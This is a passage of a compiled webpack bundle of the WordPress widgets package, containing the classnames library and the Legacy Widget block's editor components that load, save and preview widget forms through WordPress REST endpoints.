/******/ (function() { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ 4403:
/***/ (function(module, exports) {

var __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;/*!
	Copyright (c) 2018 Jed Watson.
	Licensed under the MIT License (MIT), see
	http://jedwatson.github.io/classnames
*/
/* global define */

(function () {
	'use strict';

	var hasOwn = {}.hasOwnProperty;
	var nativeCodeString = '[native code]';

	function classNames() {
		var classes = [];

		for (var i = 0; i < arguments.length; i++) {
			var arg = arguments[i];
			if (!arg) continue;

			var argType = typeof arg;

			if (argType === 'string' || argType === 'number') {
				classes.push(arg);
			} else if (Array.isArray(arg)) {
				if (arg.length) {
					var inner = classNames.apply(null, arg);
					if (inner) {
						classes.push(inner);
					}
				}
			} else if (argType === 'object') {
				if (arg.toString !== Object.prototype.toString && !arg.toString.toString().includes('[native code]')) {
					classes.push(arg.toString());
					continue;
				}

				for (var key in arg) {
					if (hasOwn.call(arg, key) && arg[key]) {
						classes.push(key);
					}
				}
			}
		}

		return classes.join(' ');
	}

	if ( true && module.exports) {
		classNames.default = classNames;
		module.exports = classNames;
	} else if (true) {
		// register as 'classnames', consistent with npm package name
		!(__WEBPACK_AMD_DEFINE_ARRAY__ = [], __WEBPACK_AMD_DEFINE_RESULT__ = (function () {
			return classNames;
		}).apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__),
		__WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));
	} else {}
}());


/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	!function() {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = function(module) {
/******/ 			var getter = module && module.__esModule ?
/******/ 				function() { return module['default']; } :
/******/ 				function() { return module; };
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	!function() {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = function(exports, definition) {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	!function() {
/******/ 		__webpack_require__.o = function(obj, prop) { return Object.prototype.hasOwnProperty.call(obj, prop); }
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	!function() {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = function(exports) {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	}();
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
// This entry need to be wrapped in an IIFE because it need to be in strict mode.
!function() {
"use strict";
// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  MoveToWidgetArea: function() { return /* reexport */ MoveToWidgetArea; },
  addWidgetIdToBlock: function() { return /* reexport */ addWidgetIdToBlock; },
  getWidgetIdFromBlock: function() { return /* reexport */ getWidgetIdFromBlock; },
  registerLegacyWidgetBlock: function() { return /* binding */ registerLegacyWidgetBlock; },
  registerLegacyWidgetVariations: function() { return /* reexport */ registerLegacyWidgetVariations; },
  registerWidgetGroupBlock: function() { return /* binding */ registerWidgetGroupBlock; }
});

// NAMESPACE OBJECT: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/index.js
var legacy_widget_namespaceObject = {};
__webpack_require__.r(legacy_widget_namespaceObject);
__webpack_require__.d(legacy_widget_namespaceObject, {
  metadata: function() { return metadata; },
  name: function() { return legacy_widget_name; },
  settings: function() { return settings; }
});

// NAMESPACE OBJECT: ./node_modules/@wordpress/widgets/build-module/blocks/widget-group/index.js
var widget_group_namespaceObject = {};
__webpack_require__.r(widget_group_namespaceObject);
__webpack_require__.d(widget_group_namespaceObject, {
  metadata: function() { return widget_group_metadata; },
  name: function() { return widget_group_name; },
  settings: function() { return widget_group_settings; }
});

;// CONCATENATED MODULE: external ["wp","blocks"]
var external_wp_blocks_namespaceObject = window["wp"]["blocks"];
;// CONCATENATED MODULE: external ["wp","element"]
var external_wp_element_namespaceObject = window["wp"]["element"];
;// CONCATENATED MODULE: external ["wp","primitives"]
var external_wp_primitives_namespaceObject = window["wp"]["primitives"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/widget.js

/**
 * WordPress dependencies
 */

const widget = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M6 3H8V5H16V3H18V5C19.1046 5 20 5.89543 20 7V19C20 20.1046 19.1046 21 18 21H6C4.89543 21 4 20.1046 4 19V7C4 5.89543 4.89543 5 6 5V3ZM18 6.5H6C5.72386 6.5 5.5 6.72386 5.5 7V8H18.5V7C18.5 6.72386 18.2761 6.5 18 6.5ZM18.5 9.5H5.5V19C5.5 19.2761 5.72386 19.5 6 19.5H18C18.2761 19.5 18.5 19.2761 18.5 19V9.5ZM11 11H13V13H11V11ZM7 11V13H9V11H7ZM15 13V11H17V13H15Z"
}));
/* harmony default export */ var library_widget = (widget);

// EXTERNAL MODULE: ./node_modules/classnames/index.js
var classnames = __webpack_require__(4403);
var classnames_default = /*#__PURE__*/__webpack_require__.n(classnames);
;// CONCATENATED MODULE: external ["wp","blockEditor"]
var external_wp_blockEditor_namespaceObject = window["wp"]["blockEditor"];
;// CONCATENATED MODULE: external ["wp","components"]
var external_wp_components_namespaceObject = window["wp"]["components"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/brush.js

/**
 * WordPress dependencies
 */

const brush = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M4 20h8v-1.5H4V20zM18.9 3.5c-.6-.6-1.5-.6-2.1 0l-7.2 7.2c-.4-.1-.7 0-1.1.1-.5.2-1.5.7-1.9 2.2-.4 1.7-.8 2.2-1.1 2.7-.1.1-.2.3-.3.4l-.6 1.1H6c2 0 3.4-.4 4.7-1.4.8-.6 1.2-1.4 1.3-2.3 0-.3 0-.5-.1-.7L19 5.7c.5-.6.5-1.6-.1-2.2zM9.7 14.7c-.7.5-1.5.8-2.4 1 .2-.5.5-1.2.8-2.3.2-.6.4-1 .8-1.1.5-.1 1 .1 1.3.3.2.2.3.5.2.8 0 .3-.1.9-.7 1.3z"
}));
/* harmony default export */ var library_brush = (brush);

;// CONCATENATED MODULE: external ["wp","i18n"]
var external_wp_i18n_namespaceObject = window["wp"]["i18n"];
;// CONCATENATED MODULE: external ["wp","data"]
var external_wp_data_namespaceObject = window["wp"]["data"];
;// CONCATENATED MODULE: external ["wp","coreData"]
var external_wp_coreData_namespaceObject = window["wp"]["coreData"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/edit/widget-type-selector.js

/**
 * WordPress dependencies
 */





function WidgetTypeSelector({
  selectedId,
  onSelect
}) {
  const widgetTypes = (0,external_wp_data_namespaceObject.useSelect)(select => {
    var _select$getSettings$w;
    const hiddenIds = (_select$getSettings$w = select(external_wp_blockEditor_namespaceObject.store).getSettings()?.widgetTypesToHideFromLegacyWidgetBlock) !== null && _select$getSettings$w !== void 0 ? _select$getSettings$w : [];
    return select(external_wp_coreData_namespaceObject.store).getWidgetTypes({
      per_page: -1
    })?.filter(widgetType => !hiddenIds.includes(widgetType.id));
  }, []);
  if (!widgetTypes) {
    return (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Spinner, null);
  }
  if (widgetTypes.length === 0) {
    return (0,external_wp_i18n_namespaceObject.__)('There are no widgets available.');
  }
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.SelectControl, {
    __nextHasNoMarginBottom: true,
    label: (0,external_wp_i18n_namespaceObject.__)('Select a legacy widget to display:'),
    value: selectedId !== null && selectedId !== void 0 ? selectedId : '',
    options: [{
      value: '',
      label: (0,external_wp_i18n_namespaceObject.__)('Select widget')
    }, ...widgetTypes.map(widgetType => ({
      value: widgetType.id,
      label: widgetType.name
    }))],
    onChange: value => {
      if (value) {
        const selected = widgetTypes.find(widgetType => widgetType.id === value);
        onSelect({
          selectedId: selected.id,
          isMulti: selected.is_multi
        });
      } else {
        onSelect({
          selectedId: null
        });
      }
    }
  });
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/edit/inspector-card.js

function InspectorCard({
  name,
  description
}) {
  return (0,external_wp_element_namespaceObject.createElement)("div", {
    className: "wp-block-legacy-widget-inspector-card"
  }, (0,external_wp_element_namespaceObject.createElement)("h3", {
    className: "wp-block-legacy-widget-inspector-card__name"
  }, name), (0,external_wp_element_namespaceObject.createElement)("span", null, description));
}

;// CONCATENATED MODULE: external ["wp","notices"]
var external_wp_notices_namespaceObject = window["wp"]["notices"];
;// CONCATENATED MODULE: external ["wp","compose"]
var external_wp_compose_namespaceObject = window["wp"]["compose"];
;// CONCATENATED MODULE: external ["wp","apiFetch"]
var external_wp_apiFetch_namespaceObject = window["wp"]["apiFetch"];
var external_wp_apiFetch_default = /*#__PURE__*/__webpack_require__.n(external_wp_apiFetch_namespaceObject);
;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/edit/control.js
/**
 * WordPress dependencies
 */




/**
 * An API for creating and loading a widget control (a <div class="widget">
 * element) that is compatible with most third party widget scripts. By not
 * using React for this, we ensure that we have complete contorl over the DOM
 * and do not accidentally remove any elements that a third party widget script
 * has attached an event listener to.
 *
 * @property {Element} element The control's DOM element.
 */
class Control {
  /**
   * Creates and loads a new control.
   *
   * @access public
   * @param {Object}   params
   * @param {string}   params.id
   * @param {string}   params.idBase
   * @param {Object}   params.instance
   * @param {Function} params.onChangeInstance
   * @param {Function} params.onChangeHasPreview
   * @param {Function} params.onError
   */
  constructor({
    id,
    idBase,
    instance,
    onChangeInstance,
    onChangeHasPreview,
    onError
  }) {
    this.id = id;
    this.idBase = idBase;
    this._instance = instance;
    this._hasPreview = null;
    this.onChangeInstance = onChangeInstance;
    this.onChangeHasPreview = onChangeHasPreview;
    this.onError = onError;

    // We can't use the real widget number as this is calculated by the
    // server and we may not ever *actually* save this widget. Instead, use
    // a fake but unique number.
    this.number = ++lastNumber;
    this.handleFormChange = (0,external_wp_compose_namespaceObject.debounce)(this.handleFormChange.bind(this), 200);
    this.handleFormSubmit = this.handleFormSubmit.bind(this);
    this.initDOM();
    this.bindEvents();
    this.loadContent();
  }

  /**
   * Clean up the control so that it can be garabge collected.
   *
   * @access public
   */
  destroy() {
    this.unbindEvents();
    this.element.remove();
    // TODO: How do we make third party widget scripts remove their event
    // listeners?
  }

  /**
   * Creates the control's DOM structure.
   *
   * @access private
   */
  initDOM() {
    var _this$id, _this$idBase;
    this.element = el('div', {
      class: 'widget open'
    }, [el('div', {
      class: 'widget-inside'
    }, [this.form = el('form', {
      class: 'form',
      method: 'post'
    }, [
    // These hidden form inputs are what most widgets' scripts
    // use to access data about the widget.
    el('input', {
      class: 'widget-id',
      type: 'hidden',
      name: 'widget-id',
      value: (_this$id = this.id) !== null && _this$id !== void 0 ? _this$id : `${this.idBase}-${this.number}`
    }), el('input', {
      class: 'id_base',
      type: 'hidden',
      name: 'id_base',
      value: (_this$idBase = this.idBase) !== null && _this$idBase !== void 0 ? _this$idBase : this.id
    }), el('input', {
      class: 'widget-width',
      type: 'hidden',
      name: 'widget-width',
      value: '250'
    }), el('input', {
      class: 'widget-height',
      type: 'hidden',
      name: 'widget-height',
      value: '200'
    }), el('input', {
      class: 'widget_number',
      type: 'hidden',
      name: 'widget_number',
      value: this.idBase ? this.number.toString() : ''
    }), this.content = el('div', {
      class: 'widget-content'
    }),
    // Non-multi widgets can be saved via a Save button.
    this.id && el('button', {
      class: 'button is-primary',
      type: 'submit'
    }, (0,external_wp_i18n_namespaceObject.__)('Save'))])])]);
  }

  /**
   * Adds the control's event listeners.
   *
   * @access private
   */
  bindEvents() {
    // Prefer jQuery 'change' event instead of the native 'change' event
    // because many widgets use jQuery's event bus to trigger an update.
    if (window.jQuery) {
      const {
        jQuery: $
      } = window;
      $(this.form).on('change', null, this.handleFormChange);
      $(this.form).on('input', null, this.handleFormChange);
      $(this.form).on('submit', this.handleFormSubmit);
    } else {
      this.form.addEventListener('change', this.handleFormChange);
      this.form.addEventListener('input', this.handleFormChange);
      this.form.addEventListener('submit', this.handleFormSubmit);
    }
  }

  /**
   * Removes the control's event listeners.
   *
   * @access private
   */
  unbindEvents() {
    if (window.jQuery) {
      const {
        jQuery: $
      } = window;
      $(this.form).off('change', null, this.handleFormChange);
      $(this.form).off('input', null, this.handleFormChange);
      $(this.form).off('submit', this.handleFormSubmit);
    } else {
      this.form.removeEventListener('change', this.handleFormChange);
      this.form.removeEventListener('input', this.handleFormChange);
      this.form.removeEventListener('submit', this.handleFormSubmit);
    }
  }

  /**
   * Fetches the widget's form HTML from the REST API and loads it into the
   * control's form.
   *
   * @access private
   */
  async loadContent() {
    try {
      if (this.id) {
        const {
          form
        } = await saveWidget(this.id);
        this.content.innerHTML = form;
      } else if (this.idBase) {
        const {
          form,
          preview
        } = await encodeWidget({
          idBase: this.idBase,
          instance: this.instance,
          number: this.number
        });
        this.content.innerHTML = form;
        this.hasPreview = !isEmptyHTML(preview);

        // If we don't have an instance, perform a save right away. This
        // happens when creating a new Legacy Widget block.
        if (!this.instance.hash) {
          const {
            instance
          } = await encodeWidget({
            idBase: this.idBase,
            instance: this.instance,
            number: this.number,
            formData: serializeForm(this.form)
          });
          this.instance = instance;
        }
      }

      // Trigger 'widget-added' when widget is ready. This event is what
      // widgets' scripts use to initialize, attach events, etc. The event
      // must be fired using jQuery's event bus as this is what widget
      // scripts expect. If jQuery is not loaded, do nothing - some
      // widgets will still work regardless.
      if (window.jQuery) {
        const {
          jQuery: $
        } = window;
        $(document).trigger('widget-added', [$(this.element)]);
      }
    } catch (error) {
      this.onError(error);
    }
  }

  /**
   * Perform a save when a multi widget's form is changed. Non-multi widgets
   * are saved manually.
   *
   * @access private
   */
  handleFormChange() {
    if (this.idBase) {
      this.saveForm();
    }
  }

  /**
   * Perform a save when the control's form is manually submitted.
   *
   * @access private
   * @param {Event} event
   */
  handleFormSubmit(event) {
    event.preventDefault();
    this.saveForm();
  }

  /**
   * Serialize the control's form, send it to the REST API, and update the
   * instance with the encoded instance that the REST API returns.
   *
   * @access private
   */
  async saveForm() {
    const formData = serializeForm(this.form);
    try {
      if (this.id) {
        const {
          form
        } = await saveWidget(this.id, formData);
        this.content.innerHTML = form;
        if (window.jQuery) {
          const {
            jQuery: $
          } = window;
          $(document).trigger('widget-updated', [$(this.element)]);
        }
      } else if (this.idBase) {
        const {
          instance,
          preview
        } = await encodeWidget({
          idBase: this.idBase,
          instance: this.instance,
          number: this.number,
          formData
        });
        this.instance = instance;
        this.hasPreview = !isEmptyHTML(preview);
      }
    } catch (error) {
      this.onError(error);
    }
  }

  /**
   * The widget's instance object.
   *
   * @access private
   */
  get instance() {
    return this._instance;
  }

  /**
   * The widget's instance object.
   *
   * @access private
   */
  set instance(instance) {
    if (this._instance !== instance) {
      this._instance = instance;
      this.onChangeInstance(instance);
    }
  }

  /**
   * Whether or not the widget can be previewed.
   *
   * @access public
   */
  get hasPreview() {
    return this._hasPreview;
  }

  /**
   * Whether or not the widget can be previewed.
   *
   * @access private
   */
  set hasPreview(hasPreview) {
    if (this._hasPreview !== hasPreview) {
      this._hasPreview = hasPreview;
      this.onChangeHasPreview(hasPreview);
    }
  }
}
let lastNumber = 0;
function el(tagName, attributes = {}, content = null) {
  const element = document.createElement(tagName);
  for (const [attribute, value] of Object.entries(attributes)) {
    element.setAttribute(attribute, value);
  }
  if (Array.isArray(content)) {
    for (const child of content) {
      if (child) {
        element.appendChild(child);
      }
    }
  } else if (typeof content === 'string') {
    element.innerText = content;
  }
  return element;
}
async function saveWidget(id, formData = null) {
  let widget;
  if (formData) {
    widget = await external_wp_apiFetch_default()({
      path: `/wp/v2/widgets/${id}?context=edit`,
      method: 'PUT',
      data: {
        form_data: formData
      }
    });
  } else {
    widget = await external_wp_apiFetch_default()({
      path: `/wp/v2/widgets/${id}?context=edit`,
      method: 'GET'
    });
  }
  return {
    form: widget.rendered_form
  };
}
async function encodeWidget({
  idBase,
  instance,
  number,
  formData = null
}) {
  const response = await external_wp_apiFetch_default()({
    path: `/wp/v2/widget-types/${idBase}/encode`,
    method: 'POST',
    data: {
      instance,
      number,
      form_data: formData
    }
  });
  return {
    instance: response.instance,
    form: response.form,
    preview: response.preview
  };
}
function isEmptyHTML(html) {
  const element = document.createElement('div');
  element.innerHTML = html;
  return isEmptyNode(element);
}
function isEmptyNode(node) {
  switch (node.nodeType) {
    case node.TEXT_NODE:
      // Text nodes are empty if it's entirely whitespace.
      return node.nodeValue.trim() === '';
    case node.ELEMENT_NODE:
      // Elements that are "embedded content" are not empty.
      // https://dev.w3.org/html5/spec-LC/content-models.html#embedded-content-0
      if (['AUDIO', 'CANVAS', 'EMBED', 'IFRAME', 'IMG', 'MATH', 'OBJECT', 'SVG', 'VIDEO'].includes(node.tagName)) {
        return false;
      }
      // Elements with no children are empty.
      if (!node.hasChildNodes()) {
        return true;
      }
      // Elements with children are empty if all their children are empty.
      return Array.from(node.childNodes).every(isEmptyNode);
    default:
      return true;
  }
}
function serializeForm(form) {
  return new window.URLSearchParams(Array.from(new window.FormData(form))).toString();
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/edit/form.js

/**
 * External dependencies
 */

/**
 * WordPress dependencies
 */






/**
 * Internal dependencies
 */

function Form({
  title,
  isVisible,
  id,
  idBase,
  instance,
  isWide,
  onChangeInstance,
  onChangeHasPreview
}) {
  const ref = (0,external_wp_element_namespaceObject.useRef)();
  const isMediumLargeViewport = (0,external_wp_compose_namespaceObject.useViewportMatch)('small');

  // We only want to remount the control when the instance changes
  // *externally*. For example, if the user performs an undo. To do this, we
  // keep track of changes made to instance by the control itself and then
  // ignore those.
  const outgoingInstances = (0,external_wp_element_namespaceObject.useRef)(new Set());
  const incomingInstances = (0,external_wp_element_namespaceObject.useRef)(new Set());
  const {
    createNotice
  } = (0,external_wp_data_namespaceObject.useDispatch)(external_wp_notices_namespaceObject.store);
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    if (incomingInstances.current.has(instance)) {
      incomingInstances.current.delete(instance);
      return;
    }
    const control = new Control({
      id,
      idBase,
      instance,
      onChangeInstance(nextInstance) {
        outgoingInstances.current.add(instance);
        incomingInstances.current.add(nextInstance);
        onChangeInstance(nextInstance);
      },
      onChangeHasPreview,
      onError(error) {
        window.console.error(error);
        createNotice('error', (0,external_wp_i18n_namespaceObject.sprintf)( /* translators: %s: the name of the affected block. */
        (0,external_wp_i18n_namespaceObject.__)('The "%s" block was affected by errors and may not function properly. Check the developer tools for more details.'), idBase || id));
      }
    });
    ref.current.appendChild(control.element);
    return () => {
      if (outgoingInstances.current.has(instance)) {
        outgoingInstances.current.delete(instance);
        return;
      }
      control.destroy();
    };
  }, [id, idBase, instance, onChangeInstance, onChangeHasPreview, isMediumLargeViewport]);
  if (isWide && isMediumLargeViewport) {
    return (0,external_wp_element_namespaceObject.createElement)("div", {
      className: classnames_default()({
        'wp-block-legacy-widget__container': isVisible
      })
    }, isVisible && (0,external_wp_element_namespaceObject.createElement)("h3", {
      className: "wp-block-legacy-widget__edit-form-title"
    }, title), (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Popover, {
      focusOnMount: false,
      placement: "right",
      offset: 32,
      resize: false,
      flip: false,
      shift: true
    }, (0,external_wp_element_namespaceObject.createElement)("div", {
      ref: ref,
      className: "wp-block-legacy-widget__edit-form",
      hidden: !isVisible
    })));
  }
  return (0,external_wp_element_namespaceObject.createElement)("div", {
    ref: ref,
    className: "wp-block-legacy-widget__edit-form",
    hidden: !isVisible
  }, (0,external_wp_element_namespaceObject.createElement)("h3", {
    className: "wp-block-legacy-widget__edit-form-title"
  }, title));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/edit/preview.js

/**
 * External dependencies
 */


/**
 * WordPress dependencies
 */





function Preview({
  idBase,
  instance,
  isVisible
}) {
  const [isLoaded, setIsLoaded] = (0,external_wp_element_namespaceObject.useState)(false);
  const [srcDoc, setSrcDoc] = (0,external_wp_element_namespaceObject.useState)('');
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    const abortController = typeof window.AbortController === 'undefined' ? undefined : new window.AbortController();
    async function fetchPreviewHTML() {
      const restRoute = `/wp/v2/widget-types/${idBase}/render`;
      return await external_wp_apiFetch_default()({
        path: restRoute,
        method: 'POST',
        signal: abortController?.signal,
        data: instance ? {
          instance
        } : {}
      });
    }
    fetchPreviewHTML().then(response => {
      setSrcDoc(response.preview);
    }).catch(error => {
      if ('AbortError' === error.name) {
        // We don't want to log aborted requests.
        return;
      }
      throw error;
    });
    return () => abortController?.abort();
  }, [idBase, instance]);

  // Resize the iframe on either the load event, or when the iframe becomes visible.
  const ref = (0,external_wp_compose_namespaceObject.useRefEffect)(iframe => {
    // Only set height if the iframe is loaded,
    // or it will grow to an unexpected large height in Safari if it's hidden initially.
    if (!isLoaded) {
      return;
    }
    // If the preview frame has another origin then this won't work.
    // One possible solution is to add custom script to call `postMessage` in the preview frame.
    // Or, better yet, we migrate away from iframe.
    function setHeight() {
      var _iframe$contentDocume, _iframe$contentDocume2;
      // Pick the maximum of these two values to account for margin collapsing.
      const height = Math.max((_iframe$contentDocume = iframe.contentDocument.documentElement?.offsetHeight) !== null && _iframe$contentDocume !== void 0 ? _iframe$contentDocume : 0, (_iframe$contentDocume2 = iframe.contentDocument.body?.offsetHeight) !== null && _iframe$contentDocume2 !== void 0 ? _iframe$contentDocume2 : 0);

      // Fallback to a height of 100px if the height cannot be determined.
      // This ensures the block is still selectable. 100px should hopefully
      // be not so big that it's annoying, and not so small that nothing
      // can be seen.
      iframe.style.height = `${height !== 0 ? height : 100}px`;
    }
    const {
      IntersectionObserver
    } = iframe.ownerDocument.defaultView;

    // Observe for intersections that might cause a change in the height of
    // the iframe, e.g. a Widget Area becoming expanded.
    const intersectionObserver = new IntersectionObserver(([entry]) => {
      if (entry.isIntersecting) {
        setHeight();
      }
    }, {
      threshold: 1
    });
    intersectionObserver.observe(iframe);
    iframe.addEventListener('load', setHeight);
    return () => {
      intersectionObserver.disconnect();
      iframe.removeEventListener('load', setHeight);
    };
  }, [isLoaded]);
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, isVisible && !isLoaded && (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Placeholder, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Spinner, null)), (0,external_wp_element_namespaceObject.createElement)("div", {
    className: classnames_default()('wp-block-legacy-widget__edit-preview', {
      'is-offscreen': !isVisible || !isLoaded
    })
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Disabled, null, (0,external_wp_element_namespaceObject.createElement)("iframe", {
    ref: ref,
    className: "wp-block-legacy-widget__edit-preview-iframe",
    tabIndex: "-1",
    title: (0,external_wp_i18n_namespaceObject.__)('Legacy Widget Preview'),
    srcDoc: srcDoc,
    onLoad: event => {
      // To hide the scrollbars of the preview frame for some edge cases,
      // such as negative margins in the Gallery Legacy Widget.
      // It can't be scrolled anyway.
      // TODO: Ideally, this should be fixed in core.
      event.target.contentDocument.body.style.overflow = 'hidden';
      setIsLoaded(true);
    },
    height: 100
  }))));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/edit/no-preview.js

/**
 * WordPress dependencies
 */

function NoPreview({
  name
}) {
  return (0,external_wp_element_namespaceObject.createElement)("div", {
    className: "wp-block-legacy-widget__edit-no-preview"
  }, name && (0,external_wp_element_namespaceObject.createElement)("h3", null, name), (0,external_wp_element_namespaceObject.createElement)("p", null, (0,external_wp_i18n_namespaceObject.__)('No preview available.')));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/edit/convert-to-blocks-button.js

/**
 * WordPress dependencies
 */





function ConvertToBlocksButton({
  clientId,
  rawInstance
}) {
  const {
    replaceBlocks
  } = (0,external_wp_data_namespaceObject.useDispatch)(external_wp_blockEditor_namespaceObject.store);
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.ToolbarButton, {
    onClick: () => {
      if (rawInstance.title) {
        replaceBlocks(clientId, [(0,external_wp_blocks_namespaceObject.createBlock)('core/heading', {
          content: rawInstance.title
        }), ...(0,external_wp_blocks_namespaceObject.rawHandler)({
          HTML: rawInstance.text
        })]);
      } else {
        replaceBlocks(clientId, (0,external_wp_blocks_namespaceObject.rawHandler)({
          HTML: rawInstance.text
        }));
      }
    }
  }, (0,external_wp_i18n_namespaceObject.__)('Convert to blocks'));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/edit/index.js

/**
 * External dependencies
 */


/**
 * WordPress dependencies
 */








/**
 * Internal dependencies
 */






function Edit(props) {
  const {
    id,
    idBase
  } = props.attributes;
  const {
    isWide = false
  } = props;
  const blockProps = (0,external_wp_blockEditor_namespaceObject.useBlockProps)({
    className: classnames_default()({
      'is-wide-widget': isWide
    })
  });
  return (0,external_wp_element_namespaceObject.createElement)("div", {
    ...blockProps
  }, !id && !idBase ? (0,external_wp_element_namespaceObject.createElement)(Empty, {
    ...props
  }) : (0,external_wp_element_namespaceObject.createElement)(NotEmpty, {
    ...props
  }));
}
function Empty({
  attributes: {
    id,
    idBase
  },
  setAttributes
}) {
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Placeholder, {
    icon: (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.BlockIcon, {
      icon: library_brush
    }),
    label: (0,external_wp_i18n_namespaceObject.__)('Legacy Widget')
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Flex, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.FlexBlock, null, (0,external_wp_element_namespaceObject.createElement)(WidgetTypeSelector, {
    selectedId: id !== null && id !== void 0 ? id : idBase,
    onSelect: ({
      selectedId,
      isMulti
    }) => {
      if (!selectedId) {
        setAttributes({
          id: null,
          idBase: null,
          instance: null
        });
      } else if (isMulti) {
        setAttributes({
          id: null,
          idBase: selectedId,
          instance: {}
        });
      } else {
        setAttributes({
          id: selectedId,
          idBase: null,
          instance: null
        });
      }
    }
  }))));
}
function NotEmpty({
  attributes: {
    id,
    idBase,
    instance
  },
  setAttributes,
  clientId,
  isSelected,
  isWide = false
}) {
  const [hasPreview, setHasPreview] = (0,external_wp_element_namespaceObject.useState)(null);
  const widgetTypeId = id !== null && id !== void 0 ? id : idBase;
  const {
    record: widgetType,
    hasResolved: hasResolvedWidgetType
  } = (0,external_wp_coreData_namespaceObject.useEntityRecord)('root', 'widgetType', widgetTypeId);
  const isNavigationMode = (0,external_wp_data_namespaceObject.useSelect)(select => select(external_wp_blockEditor_namespaceObject.store).isNavigationMode(), []);
  const setInstance = (0,external_wp_element_namespaceObject.useCallback)(nextInstance => {
    setAttributes({
      instance: nextInstance
    });
  }, []);
  if (!widgetType && hasResolvedWidgetType) {
    return (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Placeholder, {
      icon: (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.BlockIcon, {
        icon: library_brush
      }),
      label: (0,external_wp_i18n_namespaceObject.__)('Legacy Widget')
    }, (0,external_wp_i18n_namespaceObject.__)('Widget is missing.'));
  }
  if (!hasResolvedWidgetType) {
    return (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Placeholder, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Spinner, null));
  }
  const mode = idBase && (isNavigationMode || !isSelected) ? 'preview' : 'edit';
